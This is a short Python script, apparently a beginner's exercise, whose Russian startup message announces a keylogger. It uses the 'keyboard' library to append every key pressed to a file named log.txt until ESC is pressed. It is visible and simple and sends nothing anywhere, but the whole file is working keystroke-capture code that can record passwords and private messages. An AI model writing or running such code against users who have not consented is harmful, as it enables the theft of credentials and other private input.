import keyboard


def f(event):    
    f = open("log.txt", "a")
    f.write(event.name)
        

if __name__ == "__main__":
    print("Кейлогер запущен. Нажмите ESC для остановки.")
    keyboard.on_press(f)
    keyboard.wait("esc")
    
  
# fsdfdsf;lk;lk;